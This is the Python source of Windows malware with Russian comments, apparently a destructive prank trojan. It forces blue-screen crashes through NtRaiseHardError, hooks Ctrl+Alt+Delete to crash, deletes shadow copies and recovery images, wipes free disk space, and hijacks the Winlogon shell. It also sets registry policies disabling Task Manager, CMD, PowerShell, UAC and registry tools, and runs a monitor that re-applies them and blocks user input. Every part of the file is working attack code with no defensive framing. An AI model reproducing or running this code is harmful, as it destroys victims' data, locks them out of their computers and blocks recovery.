import subprocess
import winreg as reg
import keyboard
import time
import threading
import win32com.client
import ctypes
import os
import sys
import tkinter as tk
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)


def BSOD():
    null_pointer = POINTER(c_int)()
    privilege_id = c_uint(19)
    enable_privilege = c_uint(1)
    current_thread = c_uint(0)
    privilege_status = c_int()
    windll.ntdll.RtlAdjustPrivilege(
        privilege_id,
        enable_privilege,
        current_thread,
        byref(privilege_status)
    )

    error_code = c_ulong(0xC000007B)
    arg_count = c_ulong(0)
    response_status = c_uint()
    windll.ntdll.NtRaiseHardError(
        error_code,
        arg_count,
        null_pointer,
        null_pointer,
        c_uint(6),
        byref(response_status)
    )


def block_keys():
    keys_to_block = ['win', 'tab', 'shift', 'ctrl']
    for key in keys_to_block:
        keyboard.block_key(key)


def ctrt_alt_BSOD():
    keyboard.add_hotkey('ctrl+alt+delete',BSOD)
    keyboard.add_hotkey('ctrl+alt+insert', BSOD)
    keyboard.wait()


def destroy_all_recovery():
    def worker():
        try:
            flags = subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE

            # 0. Удаление winre.wim из всех возможных мест
            winre_paths = [
                r"C:\Recovery\WindowsRE\Winre.wim",
                r"C:\Windows\System32\Recovery\Winre.wim"
            ]

            for path in winre_paths:
                try:
                    if os.path.exists(path):
                        os.remove(path)
                        print(f"[✓] Удалён файл восстановления: {path}")
                except Exception as ex:
                    print(f"[!] Ошибка при удалении {path}: {ex}")

            # 1. Отключение среды восстановления
            subprocess.run(['reagentc', '/disable'], creationflags=flags, check=True)

            # 2. Удаление всех теневых копий (точек восстановления)
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=flags, check=True)

            # 3. Удаление конфигурации загрузки
            subprocess.run(['bcdedit', '/delete', '/cleanup'], creationflags=flags, check=True)

            # 4. Перезапись свободного пространства (удаление содержимого удалённых файлов)
            subprocess.run(['cipher', '/w:C:'], creationflags=flags, check=True)

            # 5. Удаление ключей восстановления в реестре
            subprocess.run([
                'reg', 'delete',
                r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore',
                '/f'
            ], creationflags=flags, check=True)

            print("[OK] Восстановление системы уничтожено.")
        except Exception as e:
            print(f"[ERROR] Критическая ошибка при уничтожении восстановления: {str(e)}")

    threading.Thread(target=worker, daemon=True).start()



def change_shell_aftervideo():
    def worker():
        try:
            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
            reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe, C:/Windows/INF/c_computeaccelerator.exe")
            reg.CloseKey(key)
        except Exception as e:
            print(f"Ошибка при установке значения реестра: {e}")
    threading.Thread(target=worker, daemon=True).start()


def change_shell():
    def worker():
        print("[START] Изменение shell запущено")
        try:
            print("[INFO] Открытие ключа реестра Winlogon...")
            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
            print("[OK] Ключ открыт")
            value = r"C:\Windows\INF\c_computeaccelerator.exe"
            print(f"[INFO] Установка значения shell: {value}")
            reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
            print("[SUCCESS] Значение 'shell' успешно изменено")
            reg.CloseKey(key)
            print("[INFO] Ключ закрыт")
        except Exception as e:
            print(f"[ERROR] Ошибка при изменении shell: {e}")
        finally:
            print("[END] Работа потока изменения shell завершена")
    threading.Thread(target=worker, daemon=True).start()


def update_icons():
    def worker():
        ico1 = r"C:\Windows\INF\1.ico"
        ico2 = r"C:\Windows\INF\2.ico"
        ico4 = r"C:\Windows\INF\4.ico"
        ico6 = r"C:\Windows\INF\6.ico"
        icon_paths = {
            "exefile": ico2, "txtfile": ico1, "batfile": ico1, "blendfile": ico2,
            "dllfile": ico2, "AutoHotkeyScript": ico2, "pngfile": ico2, "jpegfile": ico1,
            "giffile": ico2, "bittorrent": ico2, "cmdfile": ico2, "dbfile": ico2,
            "Drive": ico2, "DVD": ico2, "docxfile": ico1, "htmlfile": ico1,
            "http": ico1, "mhtmlfile": ico1, "Folder": ico6, "https": ico6,
            "icofile": ico6, "inifile": ico6, "mscfile": ico6, "ms-excel": ico2,
            "ms-publisher": ico2, "ms-word": ico2, "ms-access": ico2, "MSInfoFile": ico6,
            "Python.File": ico1, "regfile": ico2, "steamlink": ico6, "steam": ico4,
            "svgfile": ico6, "themefile": ico6, "themepackfile": ico6, "VBSFile": ico1,
            "xmlfile": ico6, "WinRAR": ico1, "Windows.VhdFile": ico6, "SearchFolder": ico6,
            "Paint.Picture": ico6, "inffile": ico1, "JSFile": ico1, "JSEFile": ico1,
            "ftp": ico2, "Word.Document.8": ico2, "Word.Document.12": ico2, "Word.RTF.8": ico2,
            "wordhtmlfile": ico2, "wordhtmltemplate": ico2, "wordmhtmlfile": ico2,
            "Wordpad.Document.1": ico2, "wordxmlfile": ico2, "uTorrent": ico1
        }
        for file_type, icon in icon_paths.items():
            key_path = f"{file_type}\\DefaultIcon"
            try:
                reg_key = reg.CreateKeyEx(reg.HKEY_CLASSES_ROOT, key_path, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, "", 0, reg.REG_SZ, icon)
                reg.CloseKey(reg_key)
                print(f"[good] {file_type} -> {icon}")
            except Exception as e:
                print(f"[error] {file_type} -> {e}")
    threading.Thread(target=worker, daemon=True).start()

def monitor_explorer():
    # Список папок для отслеживания
    target_folders = {r"C:\Windows", r"C:\Windows\INF", r"C:\test"}
    target_folders = {folder.lower() for folder in target_folders}
    # Флаг, чтобы функция вызывалась один раз при обнаружении целевой папки
    triggered = False
    shell = win32com.client.Dispatch("Shell.Application")
    
    while True:
        found_targets = set()
        for window in shell.Windows():
            try:
                doc = window.Document
                # Проверяем, что окно связано с папкой (есть атрибут Folder)
                if hasattr(doc, "Folder"):
                    folder_url = window.LocationURL
                    # Преобразуем URL в локальный путь Windows
                    if folder_url.startswith("file:///"):
                        local_path = folder_url.replace("file:///", "")
                        local_path = local_path.replace("/", "\\")
                        # Приводим к нижнему регистру для сравнения
                        local_path = local_path.lower().rstrip("\\")
                        if local_path in target_folders:
                            found_targets.add(local_path)
            except Exception:
                continue

        # Если хотя бы одна целевая папка открыта и функция ещё не вызывалась
        if found_targets and not triggered:
            BSOD()
            triggered = True
        # Если ни одна целевая папка не открыта – сбрасываем флаг для будущих срабатываний
        if not found_targets:
            triggered = False
        time.sleep(1)


all_registry_keys = [
    # === MinusRegedit ===
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoLowDiskSpaceChecks", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoDriveTypeAutoRun", "type": reg.REG_DWORD, "value": 255, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoLogoff", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoControlPanel", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoStartMenuMyGames", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoStartMenuMyMusic", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoStartMenuNetworkPlaces", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "HideClock", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "name": "DisableTaskMgr", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "name": "HideFastUserSwitching", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "name": "DisableChangePassword", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "name": "DisableLockWorkstation", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "name": "EnableLUA", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"Software\Microsoft\Windows Script Host\Settings", "name": "Enabled", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"Software\WOW6432Node\Microsoft\Windows Script Host\Settings", "name": "Enabled", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore", "name": "DisableConfig", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoDrives", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoDesktop", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"SOFTWARE\Policies\Microsoft\Windows\System", "name": "DisableCMD", "type": reg.REG_DWORD, "value": 2, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SYSTEM\CurrentControlSet\Services\USBSTOR", "name": "Start", "type": reg.REG_DWORD, "value": 4, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SYSTEM\CurrentControlSet\Control\CrashControl", "name": "AutoReboot", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoRun", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Policies\Microsoft\Windows\PowerShell", "name": "EnableScripts", "type": reg.REG_DWORD, "value": 0, "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", "name": "ExecutionPolicy", "type": reg.REG_SZ, "value": "Restricted", "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe", "name": "Debugger", "type": reg.REG_SZ, "value": "ntsd -d", "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\pwsh.exe", "name": "Debugger", "type": reg.REG_SZ, "value": "ntsd -d", "modes": ["minus"]},
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AppXDeploymentClient.exe", "name": "Debugger", "type": reg.REG_SZ, "value": "ntsd -d", "modes": ["minus"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "name": "DisableRegistryTools", "type": reg.REG_DWORD, "value": 1, "modes": ["minus"]},

    # === configure_system_settings_after_50 ===
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoFolderOptions", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "DisableSearchBoxSuggestions", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "name": "Hidden", "type": reg.REG_DWORD, "value": 0, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "name": "ShowSuperHidden", "type": reg.REG_DWORD, "value": 0, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\DWM", "name": "AccentColor", "type": reg.REG_DWORD, "value": 0x0000FF, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\DWM", "name": "ColorPrevalence", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\DWM", "name": "ColorizationColor", "type": reg.REG_DWORD, "value": 0x0000FF, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\DWM", "name": "ColorizationTransparency", "type": reg.REG_DWORD, "value": 50, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Control Panel\Colors", "name": "Window", "type": reg.REG_SZ, "value": "255 0 0", "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", "name": "NoChangingWallPaper", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop", "name": "NoChangingColor", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},
    {"hive": reg.HKEY_CURRENT_USER, "path": r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "name": "NoThemesTab", "type": reg.REG_DWORD, "value": 1, "modes": ["configure"]},

    # === other ===
    {"hive": reg.HKEY_LOCAL_MACHINE, "path": r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "name": "Shell", "type": reg.REG_SZ, "value": r"explorer.exe, C:/Windows/INF/c_computeaccelerator.exe", "modes": ["other"]}
]

def apply_registry_mode(mode):
    def set_registry_value(hive, path, name, reg_type, value):
        try:
            reg_key = reg.CreateKey(hive, path)
            reg.SetValueEx(reg_key, name, 0, reg_type, value)
            reg.CloseKey(reg_key)
            print(f"[SET] {path}\\{name} = {value}")
            return True, f"{path}\\{name} = {value}"
        except Exception as e:
            print(f"[ERROR] {path}\\{name}: {e}")
            return False, f"{path}\\{name}: {e}"

    def worker_minus():
        keys = [k for k in all_registry_keys if "minus" in k["modes"]]
        for k in keys:
            success, message = set_registry_value(
                k["hive"], k["path"], k["name"], k["type"], k["value"])
            tag = "[SET]" if success else "[ERROR]"
            print(f"{tag} {message}")

    def worker_configure():
        keys = [k for k in all_registry_keys if "configure" in k["modes"]]
        for k in keys:
            success, message = set_registry_value(
                k["hive"], k["path"], k["name"], k["type"], k["value"])
            tag = "[SET]" if success else "[ERROR]"
            print(f"{tag} {message}")


    def worker_monitor():
        from multimedia import play_video_fullscreen

        def read_registry_value(hive, path, name):
            try:
                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as reg_key:
                    val, _ = reg.QueryValueEx(reg_key, name)
                    return val
            except FileNotFoundError:
                return None
            except Exception as e:
                print(f"[MONITOR ERROR] {path}\\{name}: {e}")
                return None

        def all_keys_restored():
            return all(read_registry_value(k["hive"], k["path"], k["name"]) == k["value"] for k in all_registry_keys)

        def show_message(text):
            root = tk.Tk()
            root.withdraw()
            hwnd = root.winfo_id()
            MB_OK = 0x0
            MB_ICONWARNING = 0x30
            MB_TOPMOST = 0x40000
            ctypes.windll.user32.MessageBoxW(hwnd, text, "Warning", MB_OK | MB_ICONWARNING | MB_TOPMOST)
            root.destroy()

        def block_input(seconds):
            print(f"[BLOCK] Блокируем ввод на {seconds} сек")
            windll.user32.BlockInput(True)
            time.sleep(seconds)
            windll.user32.BlockInput(False)

        def punishment_stage(stage):
            if stage == 1:
                msg, block_sec = "Stop doing that", 10
            elif stage == 2:
                msg, block_sec = "I said, stop doing that", 20
            elif stage == 3:
                print("[PUNISH] Stage 3 — ждем восстановления всех ключей...")
                return  # Видео вызовем после проверки всех ключей
            else:
                return

            def punishment_thread():
                msg_thread = threading.Thread(target=show_message, args=(msg,), daemon=True)
                msg_thread.start()
                block_input(block_sec)
                msg_thread.join()

            threading.Thread(target=punishment_thread, daemon=True).start()

        print("[MONITOR] Запущен мониторинг ключей")
        violation_counter = [0]
        try:
            while True:
                for key in all_registry_keys:
                    current = read_registry_value(key["hive"], key["path"], key["name"])
                    if current != key["value"]:
                        print(f"[MONITOR WARNING] {key['path']}\\{key['name']}: текущ.={current}, ожид.={key['value']}")
                        try:
                            reg_key = reg.CreateKey(key["hive"], key["path"])
                            reg.SetValueEx(reg_key, key["name"], 0, key["type"], key["value"])
                            reg.CloseKey(reg_key)
                            print(f"[RESTORE] Восстановлено {key['path']}\\{key['name']} = {key['value']}")
                        except Exception as e:
                            print(f"[ERROR RESTORE] {key['path']}\\{key['name']}: {e}")
                        violation_counter[0] += 1
                        punishment_stage(violation_counter[0])

                if violation_counter[0] >= 3 and all_keys_restored():
                    print("[MONITOR] Все ключи восстановлены — запускаем видео")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break

                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[MONITOR] Ctrl+C получен — остановка мониторинга")

        print("[MONITOR] Мониторинг завершён")


    if mode == "minus":
        worker_minus()
        print("[MAIN] Режим minus завершен")
    elif mode == "configure":
        worker_configure()
        print("[MAIN] Режим configure завершен")
    elif mode == "monitor":
        worker_monitor()
        print("[MAIN] Выход из режима мониторинга")
    else:
        print(f"[ERROR] Неизвестный режим: {mode}")
